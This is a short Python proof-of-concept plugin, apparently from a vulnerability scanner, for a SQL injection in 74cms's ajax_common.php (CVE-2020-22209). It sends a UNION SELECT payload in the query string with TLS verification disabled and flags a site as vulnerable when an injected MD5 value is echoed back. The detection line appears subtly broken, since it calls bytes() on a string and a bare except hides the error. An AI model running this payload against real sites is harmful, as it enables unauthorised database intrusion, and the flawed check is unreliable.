#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '74cms - ajax_common.php SQL Injection CVE-2020-22209',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def randomInt(n,m):#返回某个范围中的int
  import random
  return random.randint(n,m)
def hashmd5(s):
  import hashlib
  md5 = hashlib.md5()
  md5.update(str(s).encode('utf-8'))
  str_md5 = md5.hexdigest()
  return str_md5
def run(url,ua):
  r0 = randomInt(900000000,1000000000)
  r1 = hashmd5(r0)
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = f"/plus/ajax_common.php?act=hotword&query=aa%錦%27%20union%20select%201,md5({r0}),3%23%27"
  url1 = url + target
  ret['url'] = url1
  
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if bytes(r1) in res.text:
      # ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret